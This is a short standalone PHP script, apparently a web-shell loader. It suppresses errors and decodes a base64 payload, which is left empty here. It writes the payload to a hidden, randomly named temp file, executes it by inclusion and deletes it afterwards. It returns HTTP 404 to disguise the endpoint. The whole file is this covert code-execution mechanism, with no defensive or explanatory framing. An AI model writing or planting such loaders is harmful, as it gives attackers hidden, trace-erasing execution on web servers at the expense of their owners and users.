<?php
$z = "";
@ini_set("display_errors","0");@error_reporting(0);
$c=base64_decode($z,true);
if($c===false){http_response_code(404);exit;}
$f=sys_get_temp_dir()."/.px".bin2hex(random_bytes(6)).".php";
if(@file_put_contents($f,$c)!==false){
  try{@include $f;}finally{@unlink($f);}
  exit;
}
http_response_code(404);
exit;